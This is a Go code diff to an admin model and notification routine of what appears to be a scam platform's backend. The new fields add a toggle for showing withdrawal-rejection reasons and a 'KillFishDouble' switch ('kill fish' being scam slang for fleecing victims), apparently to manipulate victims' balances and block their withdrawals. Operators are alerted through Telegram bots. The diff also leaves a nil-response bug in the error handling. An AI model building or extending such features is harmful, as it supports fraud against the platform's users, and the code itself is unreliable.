@@ -17,23 +17,26 @@ import (
 )
 
 type Admin struct {
-	ID                   uint   `gorm:"primaryKey;comment:'主键'"`
-	Username             string `gorm:"varchar(225)"`
-	Password             string `gorm:"varchar(225)"`
-	Token                string `gorm:"varchar(225)"`
-	Level                int    `gorm:"int(10);default:0"`
-	Status               int    `gorm:"int(10);default:1"`
-	Ip                   string `gorm:"varchar(225)"`
-	TheOnlyInvited       string //唯一邀请码
-	Updated              int64
-	Created              int64
-	Belong               int
-	ServiceAddress       string `gorm:"type:text"` //客服地址
-	ServiceAddressSwitch int
-	InComeTimes          int    `gorm:"int(10);default:1"` //发送收益次数
-	TelegramToken        string //小飞机的token
-	TelegramChatId       string //小飞机的聊天ID
-	LongUrl              string
+	ID                             uint   `gorm:"primaryKey;comment:'主键'"`
+	Username                       string `gorm:"varchar(225)"`
+	Password                       string `gorm:"varchar(225)"`
+	Token                          string `gorm:"varchar(225)"`
+	Level                          int    `gorm:"int(10);default:0"`
+	Status                         int    `gorm:"int(10);default:1"`
+	Ip                             string `gorm:"varchar(225)"`
+	TheOnlyInvited                 string //唯一邀请码
+	Updated                        int64
+	Created                        int64
+	Belong                         int
+	ServiceAddress                 string `gorm:"type:text"` //客服地址
+	ServiceAddressSwitch           int
+	InComeTimes                    int    `gorm:"int(10);default:1"` //发送收益次数
+	TelegramToken                  string //小飞机的token
+	TelegramChatId                 string //小飞机的聊天ID
+	LongUrl                        string
+	WithdrawalRejectedReasonSwitch int `gorm:"int(10);default:2"` //提现驳回原因开矿   1 开  2 关
+	KillFishDouble                 int `gorm:"int(1);default:2"`  //杀鱼资产翻倍  1  开 2   关
+
 }
 
 /**
@@ -74,10 +77,12 @@ func CheckIsExistModelAdmin(db *gorm.DB) {
 func NotificationAdmin(Db *gorm.DB, adminID int, Message string) {
 	admin := Admin{}
 	err := Db.Where("id=?", adminID).First(&admin).Error
-
 	if err == nil {
 		url := "https://api.telegram.org/bot" + admin.TelegramToken + "/sendMessage?chat_id=" + admin.TelegramChatId + "&text=" + Message
-		res, _ := http.Get(url)
+		res, err := http.Get(url)
+		if err != nil {
+			fmt.Println(err.Error())
+		}
 		defer res.Body.Close()
 	}
 
